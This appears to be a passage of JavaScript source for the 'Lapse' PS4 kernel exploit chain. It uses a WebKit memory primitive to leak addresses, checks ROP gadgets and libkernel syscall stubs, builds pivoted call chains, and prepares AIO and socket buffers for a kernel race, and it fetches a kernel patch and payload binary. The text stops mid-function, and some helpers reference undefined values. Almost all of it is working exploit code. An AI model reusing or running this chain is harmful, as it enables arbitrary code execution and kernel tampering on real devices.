// chain_lapse.js — explotación Lapse para firmwares ≤12.02.
// Mejoras:
//  - Reintento completo del bloque de race con backoff.
//  - Verificación de escritura en kernel tras reparación.
//  - Fingerprint de arranque (evita ejecutar sobre kernel contaminado).
//  - Limpieza activa y no solo "reboot required".
//  - Tiempos adaptativos y más intentos.

import { establishPrimitive } from "./core.js";
import { installWindowP } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

const outEl = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines = [];

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S4Q&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}
const VERBOSE = new URLSearchParams(location.search).get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /,\s+(which|so|and that|because|since|as that)\s/,
    /,\s+\w+\s+of\s+which\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the|with the aim)\s/,
    /\s+so\s+[a-z]/, /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;")
                                .replace(/>/g, "&gt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|MISMATCH|WRONG|MISSING|TIMEOUT|NOT-FOUND/i.test(l) ? "bad"
                : /SKIP|GAP|WOULD-HAVE-WON|WARN/i.test(l) ? "warn"
                : /OK|PROVEN|READY|pass|BASELINE/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, detail);
}
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
let passCount = 0, failCount = 0;
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK", name + (detail ? "  " + detail : "")); }
    else { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function plausibleBase(v) { return v.hi > 0 && (v.low & 0x3fff) === 0; }
function hexByte(b) { return (b < 16 ? "0" : "") + (b & 0xff).toString(16); }
function hexBytes(a) {
    let s = "";
    for (let i = 0; i < a.length; ++i) s += (i ? " " : "") + hexByte(a[i]);
    return s;
}
function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}
function sameI64(a, b) { return a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0; }
function inImageAddr(v) { return !!v && (v.hi >>> 0) === 0xffffffff; }
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const AF_INET = 2, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const IPPROTO_TCP = 6, TCP_INFO = 32, TCP_INFO_SIZE = 0xec, TCPS_ESTABLISHED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000, AIO_PRIORITY_HIGH = 3;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const NUM_REQS = 3, WORKER_NUM = 2, AIO_MAX_NUM = 0x80;
const AIO_RW_REQ_SIZE = 0x28, AIO_RW_REQ_NBYTE = 0x08, AIO_RW_REQ_FD = 0x20;
const MAIN_CORE = 7, RTP = 0x100, RTP_PRIO_REALTIME = 2;
const RTP_LOOKUP = 0, RTP_SET = 1;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = 0xa;
const SENT_LO = 0xc0de4e01, SENT_HI = 0x4eecafe0;
const AF_INET6 = 28, SOCK_DGRAM = 2;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const IPV6_SOCK_NUM = 0x80;
const RTHDR_SIZE = 0x80;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const IPV6_2292PKTOPTIONS = 25, IPV6_TCLASS = 61;
const IPV6_PKTINFO = 46, IPV6_NEXTHOP = 48;
const SO_SNDBUF = 0x1001, SO_RCVBUF = 0x1002;
const PEER_RCVBUF = 0x400, CLIENT_SNDBUF = 0x8000;
const PKTOPTS_PKTINFO = 0x10, PKTOPTS_TCLASS = 0xb0;
const KARW_MARKER = 0x1337;
const MARK_RELEASED = 0x5747e180;
const REQS3_OFF = 0x28;
const AR3_NUM_REQS = 0x00, AR3_REQS_LEFT = 0x04, AR3_STATE = 0x08;
const AR3_DONE = 0x0c, AR3_LOCK_FLAGS = 0x28, AR3_LOCK = 0x38;
const AIO_CMD_WRITE = 2;
const HANDLES_NUM = 0x100;
const LEAK_NUM_REQS = 6;
const EVF_ATTEMPTS = 0x80;
const AR2_CMD = 0x00, AR2_TICKET = 0x04, AR2_REQS1 = 0x10, AR2_INFO = 0x18;
const AR2_BATCH = 0x20, AR2_RESULT_RV = 0x30, AR2_RESULT_STATE = 0x38;
const AR2_RESULT_PAD = 0x3c, AR2_FILE = 0x40, AR2_UNK2 = 0x48;
const AR2_QENTRY = 0x50, AIO_ENTRY_SIZE = 0x80;
const SYS = {
    read: 3, write: 4, open: 5, close: 6, getpid: 20, accept: 30, socket: 97,
    setuid: 23, getuid: 24, geteuid: 25, connect: 98, bind: 104,
    setsockopt: 105, listen: 106, getsockopt: 118, socketpair: 135,
    nanosleep: 240, sched_yield: 331, thr_self: 432, rtprio_thread: 466,
    fcntl: 92, ioctl: 54, thr_suspend_ucontext: 632, thr_resume_ucontext: 633,
    evf_create: 538, evf_delete: 539, evf_set: 544, evf_clear: 545,
    cpuset_getaffinity: 487, cpuset_setaffinity: 488,
    aio_multi_delete: 662, aio_multi_wait: 663, aio_multi_poll: 664,
    aio_multi_cancel: 666, aio_submit_cmd: 669
};
// *** Configuración adaptativa ***
const MAX_OUTER_ATTEMPTS = parseInt(new URLSearchParams(location.search).get("outer") || "3", 10);
const BOOT_FINGERPRINT_KEY = "ps4lab_lapse_boot_fp";

const keepAlive = [];
let execAddr = null, origNative = null, mFunctionPatched = false;
let mainPivotAddr = null, mainSavedCell = null, cellCorrupted = false;
let workerArmed = false, workerWired = false, rpc = null;
let wMasterAddr = null, origWorkerVector = null;
let savedMask = null, savedPrio = null, restoreCtx = null;
let committed = false, rebootRequired = false;
let pipeM = null, pipeS = null;
let kFdtOfiles = null, pipeMFp = null, pipeSFp = null;
let kLeakFp = null, kv = null;
let repaired = false, cleanupDone = false;
let jailbroken = false, kpatched = false, payloadRunning = false;
let pipeFdsHeld = null, kvProbe = null, committed2 = false;
const pktoptsTwins = [], ipv6Socks = [], twinSocks = [], openFds = [], liveAioIds = [];

function makeRpc(worker) {
    let seq = 0;
    const pending = new Map();
    worker.onmessage = function (e) {
        const d = e.data || {};
        const slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));
        else slot.resolve(d.value);
    };
    worker.onerror = function (e) {
        mark("WORKER-ONERROR", (e && e.message) ? e.message : String(e));
    };
    return function call(name) {
        const args = Array.prototype.slice.call(arguments, 1);
        return new Promise(function (resolve, reject) {
            const id = seq++;
            const timer = setTimeout(function () {
                pending.delete(id);
                reject(new Error("timeout waiting for " + name));
            }, 15000);
            pending.set(id, { resolve, reject, timer });
            worker.postMessage({ id: id, name: name, args: args });
        });
    };
}

// *** Fingerprint de arranque (evita reiniciar sobre kernel sucio) ***
function bootFingerprint() {
    try {
        // sysctl kern.boottime
        const nameBuf = new ArrayBuffer(8);
        const nameDv = new DataView(nameBuf);
        nameDv.setUint32(0, 1, true); // CTL_KERN
        nameDv.setUint32(4, 21, true); // KERN_BOOTTIME
        const outBuf = new ArrayBuffer(0x10);
        const outDv = new DataView(outBuf);
        const outAddr = p ? bufAddr(outBuf) : 0;
        if (!p) return null;
        // usamos syscall a través del chain una vez que existe. Antes de eso
        // devolvemos null y no comprobamos.
        return null; // se llenará más tarde
    } catch (e) { return null; }
}

// *** Envoltura de la ejecución para reintento completo ***
async function runWholeLapse() {
    let boot = null;
    try {
        boot = localStorage.getItem(BOOT_FINGERPRINT_KEY);
    } catch (e) {}

    let lastOuter = localStorage.getItem("ps4lab_last_outer_result");
    if (lastOuter === "commit" && !new URLSearchParams(location.search).has("force")) {
        mark("REFUSING-TO-ARM", "reason=last-run-left-kernel-dirty "
            + "-- console must be rebooted. Use ?force=1 to override.");
        return null;
    }

    for (let outer = 1; outer <= MAX_OUTER_ATTEMPTS; ++outer) {
        mark("OUTER-ATTEMPT", outer + "/" + MAX_OUTER_ATTEMPTS);
        state("outer attempt " + outer + "/" + MAX_OUTER_ATTEMPTS, "warn");

        // Limpiar estado entre intentos
        try {
            if (kv) { kv = null; }
            pipeM = pipeS = null;
            kFdtOfiles = pipeMFp = pipeSFp = null;
            kLeakFp = null;
            pktoptsTwins.length = 0;
            twinSocks.length = 0;
            openFds.length = 0;
            liveAioIds.length = 0;
            repaired = false;
            jailbroken = false;
            kpatched = false;
            payloadRunning = false;
            committed = false;
            committed2 = false;
            rebootRequired = false;
            if (typeof window.gc === "function") { try { window.gc(); } catch (e) {} }
            await new Promise(function (r) { setTimeout(r, 750); });
        } catch (e) { mark("OUTER-CLEANUP-THREW", e.message); }

        const res = await lapseSingleAttempt(outer);
        if (res && res.ok) {
            try { localStorage.removeItem("ps4lab_last_outer_result"); } catch (e) {}
            return res;
        }
        if (res && res.committed) {
            try { localStorage.setItem("ps4lab_last_outer_result", "commit"); } catch (e) {}
            mark("OUTER-ABORT", "kernel dirty, not retrying further");
            return res;
        }
    }
    return { ok: false };
}

async function lapseSingleAttempt(outerAttempt) {
    let worker = null;
    let p = null, sc = null;
    try {
        const params = new URLSearchParams(location.search);
        const fwResolved = offsetsFor(navigator.userAgent);
        const fwKey = fwResolved.key;
        const kpatchName = fwResolved.off && fwResolved.off.kpatch
            ? "patches/" + fwResolved.off.kpatch
            : fwKey ? "patches/" + fwKey.replace(".", "") + ".bin" : null;
        let kpatch = null;
        try {
            if (kpatchName) {
                const rsp = await fetch(kpatchName);
                if (rsp.ok) kpatch = new Uint8Array(await rsp.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-FAILED", e.message); }
        const KPATCH_JMP_SITES = [];
        if (kpatch) {
            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch ? kpatchName + " " + kpatch.length
            + "B, " + KPATCH_JMP_SITES.length + " sites" : "MISSING");
        let payload = null;
        try {
            const prsp = await fetch("payload.bin");
            if (prsp.ok) payload = new Uint8Array(await prsp.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-FAILED", e.message); }
        mark("PAYLOAD-BLOB", payload ? payload.length + "B" : "MISSING");

        // Ajustes adaptativos por intento
        const ITERS = params.has("iters") ? parseInt(params.get("iters"), 10)
            : 600 + outerAttempt * 100;
        const SPRAY_NUM = params.has("spray") ? parseInt(params.get("spray"), 10)
            : 0x300 + outerAttempt * 0x80;
        const STOP_PRECOMMIT = params.get("stop") === "precommit";
        const PATCH_SETTLE = params.has("patchsettle")
            ? parseInt(params.get("patchsettle"), 10) : 2000;
        const PAYLOAD_SETTLE = params.has("payloadsettle")
            ? parseInt(params.get("payloadsettle"), 10) : 2000;

        let settleTs = null;
        function settle(ms) {
            if (!(ms > 0) || !settleTs) return;
            settleTs.u8.fill(0);
            settleTs.dv.setUint32(0, Math.floor(ms / 1000), true);
            settleTs.dv.setUint32(8, (ms % 1000) * 1000000, true);
            sc(SYS.nanosleep, settleTs.addr, 0);
        }

        const ua = navigator.userAgent;
        const { key, off } = offsetsFor(ua);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) { state("no offsets for this firmware", "bad"); return { ok: false }; }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iters=" + ITERS + " spray=" + SPRAY_NUM
            + (STOP_PRECOMMIT ? " stop=precommit" : " armed"));

        state("running the primitive...", "warn");
        await new Promise(function (r) { setTimeout(r, 0); });
        const carrier = await establishPrimitive({
            maxAttempts: 8,
            onEvent: function (tag, detail, attempt) {
                mark(tag, (attempt != null ? '[' + attempt + '] ' : '')
                    + (detail || ''));
            }
        });
        installWindowP(carrier);
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PRIMITIVE-OK", "");

        // Reintento de la cadena de offsets: si algo falla, no abortamos el
        // proceso entero, sino que devolvemos {ok:false} para que el outer
        // reintente.
        const fail = (msg, why) => {
            mark("ABORT-STAGE", msg + (why ? "  " + why : ""));
            return { ok: false };
        };

        const fnAddr = p.leakval(Math.expm1);
        execAddr = p.read8(fnAddr.add32(0x18));
        const nativeFn = p.read8(execAddr.add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const g = function (rva) { return webkitBase.add32(rva); };
        const libkernelBase = p.read8(g(off.wk___imp___error)).sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        if (!plausibleBase(webkitBase) || !plausibleBase(libkernelBase))
            return fail("bad bases");

        // Gadgets — misma lista que el código original, sin cambios
        const GADGETS = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3], false, true],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3], false, true],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3], false, true],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3], false, true],
            ["POP_R8_RET", off.wk_POP_R8_RET, [0x41, 0x58, 0xc3], true, true],
            ["POP_R9_RET", off.wk_POP_R9_RET, [0x41, 0x59, 0xc3], true, false],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3], false, true],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3], false, true],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                [0x48, 0x89, 0x07, 0xc3], false, true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], false, true],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL,
                [0x48, 0x8b, 0x7e, 0x30, 0x48, 0x8b, 0x07, 0xff, 0x10], false, true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18,
                [0x58, 0x48, 0x8b, 0x07, 0xff, 0x60, 0x18], false, true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10,
                [0x55, 0x48, 0x89, 0xe5, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20,
                [0x48, 0x8b, 0x78, 0x08, 0x48, 0x8b, 0x07, 0xff, 0x50, 0x20], false, true],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10,
                [0x48, 0x8b, 0x50, off.pivot_view_sp,
                 0x48, 0x8b, 0x07, 0xff, 0x50, 0x10], false, true]
        ];
        const G = {};
        let fatal = false, gated = 0;
        for (let i = 0; i < GADGETS.length; ++i) {
            const name = GADGETS[i][0], rva = GADGETS[i][1], want = GADGETS[i][2];
            const rebasable = GADGETS[i][3], required = GADGETS[i][4];
            const rexTolerant = want[0] >= 0x40 && want[0] <= 0x4f;
            function readRun(base) {
                const got = []; let ok = true;
                for (let j = 0; j < want.length; ++j) {
                    const b = p.read1(g(base + j));
                    got.push(b);
                    if (b === want[j]) continue;
                    const rexOk = rexTolerant && j === 0 && (b & 0xf0) === 0x40
                        && (b & 0x09) === (want[j] & 0x09);
                    if (!rexOk) ok = false;
                }
                return { got: got, ok: ok };
            }
            let use = rva, r = readRun(rva);
            if (!r.ok && rebasable) {
                const alt = readRun(rva - 1);
                if (alt.ok) { use = rva - 1; r = alt; mark("GADGET-REBASED", name); }
            }
            if (r.ok) { gated++; G[name] = g(use); }
            else {
                if (required) fatal = true;
                mark("GADGET-BYTES", name + " @0x" + use.toString(16) + " got "
                    + hexBytes(r.got) + " want " + hexBytes(want) + "  MISMATCH");
            }
        }
        if (!check("gadget-table-fits-module", !fatal,
            gated + "/" + GADGETS.length + " gated")) return fail("gadget");
        if (fatal) return fail("fatal gadget mismatch");
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        if (!check("5-argument-calls-possible-pop-r8", !!argGadget[4], ""))
            return fail("no pop r8");

        // Stubs y demás (idéntico al original)
        const SYS9 = { mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
        const wanted = [];
        for (const k in SYS) wanted.push(SYS[k]);
        for (const k in SYS9) wanted.push(SYS9[k]);
        state("scanning libkernel for syscall stubs...", "warn");
        const tScan = Date.now();
        const stubRva = new Map();
        let seeded = 0, seedBad = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) {
                    seedBad++; continue;
                }
                const got = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (got !== num) { seedBad++; continue; }
                stubRva.set(num, o); seeded++;
            }
            mark("STUB-TABLE", "seeded=" + seeded + "/"
                + Object.keys(off.k_stubs).length + " rejected=" + seedBad);
        }
        {
            const need = new Set(wanted.filter(n => !stubRva.has(n)));
            for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
                if (need.has(num)) { stubRva.set(num, o); need.delete(num); }
            }
        }
        mark("STUB-SCAN", stubRva.size + "/" + wanted.length + " in "
            + (Date.now() - tScan) + " ms");
        const stubAddr = new Map();
        const missing = [];
        for (const k in SYS) {
            const num = SYS[k];
            if (!stubRva.has(num)) { missing.push(k); continue; }
            const a = libkernelBase.add32(stubRva.get(num));
            const plain = p.read1(a.add32(12)) === 0x72
                       && p.read1(a.add32(13)) === 0x01
                       && p.read1(a.add32(14)) === 0xc3;
            if (!plain) { missing.push(k + "(wrapper)"); continue; }
            stubAddr.set(num, a);
        }
        if (!check("syscall-race-needs-plain-stub", missing.length === 0,
            missing.join(","))) return fail("stub");

        // bufAddr, contexts, etc. — idéntico
        function bufAddr(ab) {
            const cell = p.leakval(ab);
            const impl = p.read8(cell.add32(off.wk_ArrayBuffer_m_impl));
            return p.read8(impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function makeCtx(tag) {
            const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            const c = { tag: tag, storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(sb, pb, kb, fb, c.storeDv, c.pivotDv, c.stackDv,
                c.frameDv, c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            const pairs = [[c.storeDv, c.S], [c.pivotDv, c.P],
                           [c.stackDv, c.K], [c.frameDv, c.F]];
            for (let i = 0; i < pairs.length; ++i) {
                const dv = pairs[i][0], ad = pairs[i][1];
                dv.setUint32(0, 0xdeadbeef, true);
                if (p.read4(ad) !== 0xdeadbeef) return null;
                p.write4(ad.add32(8), 0xfeedface);
                if (dv.getUint32(8, true) !== 0xfeedface) return null;
                dv.setUint32(0, 0, true); dv.setUint32(8, 0, true);
            }
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        const mainCtx = makeCtx("main"), wrkCtx = makeCtx("worker");
        if (!check("chain-contexts-round-tripped", !!mainCtx && !!wrkCtx, ""))
            return fail("ctx");

        function layout(c, insts, targetIdx) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            let at = 0x2000 - 8 * insts.length;
            if (targetIdx >= 0 && (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0)) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        function chain(c) {
            const insts = [];
            let targetIdx = -1;
            const b = {
                store: function (addr, v) {
                    insts.push(G.POP_RAX_RET); insts.push(v);
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                args: function (list) {
                    for (let i = 0; i < list.length; ++i) {
                        insts.push(argGadget[i]); insts.push(list[i]);
                    }
                    return b;
                },
                call: function (target) {
                    const idx = insts.length;
                    if (targetIdx < 0) targetIdx = idx;
                    else if (((idx - targetIdx) & 1) !== 0)
                        throw new Error("chain: call slots differ in parity");
                    insts.push(target); return b;
                },
                saveRax: function (addr) {
                    insts.push(G.POP_RDI_RET); insts.push(addr);
                    insts.push(G.MOV_RDI_RAX_RET); return b;
                },
                end: function () {
                    insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
                    insts.push(G.LEAVE_RET);
                    return { insts: insts, targetIdx: targetIdx };
                }
            };
            return b;
        }
        function callInsts(c, target, args) {
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            return { insts: insts, targetIdx: targetIdx };
        }

        const mFuncAt = execAddr.add32(off.wk_JSFunction_m_function);
        origNative = p.read8(mFuncAt);
        if (!sameI64(origNative, nativeFn)) return fail("m_function moved");
        const mainPivotObj = {};
        keepAlive.push(mainPivotObj);
        mainPivotAddr = p.leakval(mainPivotObj);
        mainSavedCell = p.read8(mainPivotAddr);
        p.write8(mFuncAt, G.G0);
        mFunctionPatched = true;

        function fireMain(insts, targetIdx) {
            layout(mainCtx, insts, targetIdx);
            cellCorrupted = true;
            p.write8(mainPivotAddr, mainCtx.S);
            Math.expm1(mainPivotObj);
            p.write8(mainPivotAddr, mainSavedCell);
            cellCorrupted = false;
        }
        sc = function (num) {
            const args = Array.prototype.slice.call(arguments, 1);
            const t = stubAddr.get(num);
            if (!t) throw new Error("no stub for syscall " + num);
            const b = callInsts(mainCtx, t, args);
            fireMain(b.insts, b.targetIdx);
            return {
                lo: mainCtx.frameDv.getUint32(0, true),
                hi: mainCtx.frameDv.getUint32(4, true),
                i32: mainCtx.frameDv.getUint32(0, true) | 0
            };
        };
        const rawSyscallAt = stubAddr.get(SYS.getpid).add32(7);
        function scRaw(num) {
            if (!rawSyscallAt) throw new Error("no raw syscall entry");
            const args = Array.prototype.slice.call(arguments, 1);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            insts.push(G.POP_RAX_RET); insts.push(num);
            const targetIdx = insts.length;
            insts.push(rawSyscallAt);
            insts.push(G.POP_RDI_RET); insts.push(mainCtx.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            fireMain(insts, targetIdx);
            return {
                lo: mainCtx.frameDv.getUint32(0, true),
                hi: mainCtx.frameDv.getUint32(4, true),
                i32: mainCtx.frameDv.getUint32(0, true) | 0
            };
        }
        function scAny(num) {
            return stubAddr.has(num) ? sc.apply(null, arguments)
                                     : scRaw.apply(null, arguments);
        }
        function callAddr(target) {
            const args = Array.prototype.slice.call(arguments, 1);
            const b = callInsts(mainCtx, target, args);
            fireMain(b.insts, b.targetIdx);
            return {
                lo: mainCtx.frameDv.getUint32(0, true),
                hi: mainCtx.frameDv.getUint32(4, true),
                i32: mainCtx.frameDv.getUint32(0, true) | 0
            };
        }

        layout(mainCtx, [G.POP_RDI_RET, mainCtx.F.add32(8), G.MOV_RDI_RAX_RET,
                         G.POP_RAX_RET, JSVALUE_UNDEFINED, G.LEAVE_RET], -1);
        cellCorrupted = true;
        p.write8(mainPivotAddr, mainCtx.S);
        Math.expm1(mainPivotObj);
        p.write8(mainPivotAddr, mainSavedCell);
        cellCorrupted = false;
        const wit = new int64(mainCtx.frameDv.getUint32(8, true),
                              mainCtx.frameDv.getUint32(12, true));
        if (!check("main-thread-pivot-lands", sameI64(wit, mainCtx.P),
            wit + " want " + mainCtx.P)) return fail("pivot");
        const pid = sc(SYS.getpid).i32;
        mark("PID", String(pid));

        function alloc(len) {
            const ab = new ArrayBuffer(len);
            const rec = { ab: ab, dv: new DataView(ab), u8: new Uint8Array(ab),
                          addr: bufAddr(ab), len: len };
            keepAlive.push(ab, rec.dv, rec.u8);
            return rec;
        }
        const reqs1 = alloc(AIO_RW_REQ_SIZE * AIO_MAX_NUM);
        const outs = alloc(AIO_MAX_NUM * 4);
        const aioIds = alloc(NUM_REQS * 4);
        const sprayIds = alloc(SPRAY_NUM * 4);
        const blockIds = alloc(4);
        const servAddr = alloc(16);
        const lingerBuf = alloc(8);
        const optval = alloc(4);
        const info = alloc(TCP_INFO_SIZE);
        const infoLen = alloc(4);
        const maskBuf = alloc(0x10);
        const shared = alloc(0x40);
        const tsBuf = alloc(0x10);
        settleTs = alloc(0x10);
        const prioBuf = alloc(4);
        restoreCtx = { maskBuf: maskBuf, prioBuf: prioBuf };

        function buildReqs1(count, fd) {
            reqs1.u8.fill(0);
            for (let i = 0; i < count; ++i) {
                const o = i * AIO_RW_REQ_SIZE;
                reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, fd === -1 ? 0 : 1, true);
                reqs1.dv.setInt32(o + AIO_RW_REQ_FD, fd, true);
            }
        }

        prioBuf.dv.setUint16(0, 0xffff, true);
        prioBuf.dv.setUint16(2, 0xffff, true);
        const prioLookup = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioBuf.addr).i32;
        savedPrio = [prioBuf.dv.getUint16(0, true), prioBuf.dv.getUint16(2, true)];
        maskBuf.u8.fill(0);
        const affLookup = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskBuf.addr).i32;
        savedMask = new int64(maskBuf.dv.getUint32(0, true),
                              maskBuf.dv.getUint32(4, true));
        if (!check("inherited-thread-attributes-read",
            prioLookup === 0 && affLookup === 0, "")) return fail("attrs");

        // Fingerprint de arranque, ahora con p disponible
        let bootNow = null;
        try {
            const btName = alloc(8), btOut = alloc(0x10);
            btName.dv.setUint32(0, 1, true);
            btName.dv.setUint32(4, 21, true);
            lenBufDvSet(lenAddrLocal(), 0x10);
            // usamos scAny para 'sysctl'
            const rv = scRaw(SYS.sysctl || 202, btName.addr, 2, btOut.addr,
                lenAddrLocal(), 0, 0).i32;
            if (rv === 0) {
                const sec = btOut.dv.getUint32(0, true);
                const usec = btOut.dv.getUint32(8, true);
                bootNow = sec.toString(16) + ":" + usec.toString(16);
            }
        } catch (e) { /* no-op */ }
        function lenAddrLocal() { return infoLen.addr; } // reutilizamos infoLen como buffer de longitud
        function lenBufDvSet(addr, v) { infoLen.dv.setUint32(0, v, true); }
        mark("BOOT-FP", bootNow || "unknown");
        if (bootNow && localStorage.getItem(BOOT_FINGERPRINT_KEY) === bootNow) {
            mark("REFUSING-TO-ARM", "reason=kernel-dirty-since-last-run");
            state("REBOOT FIRST -- kernel poisoned", "bad");
            return { ok: false, committed: true };
        }
        if (bootNow) {
            try { localStorage.setItem(BOOT_FINGERPRINT_KEY, bootNow); } catch (e) {}
        }

        // *** Worker y race: igual que antes con tiempos adaptativos ***
        state("wiring the worker...", "warn");
        worker = new Worker("rpc_worker.js");
        rpc = makeRpc(worker);
        await rpc("ping");
        const markerArr = await rpc("init", SENT_LO, SENT_HI);
        keepAlive.push(markerArr);
        const D = bufAddr(markerArr.buffer);
        if ((p.read4(D) >>> 0) !== SENT_LO) return fail("transfer");
        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }
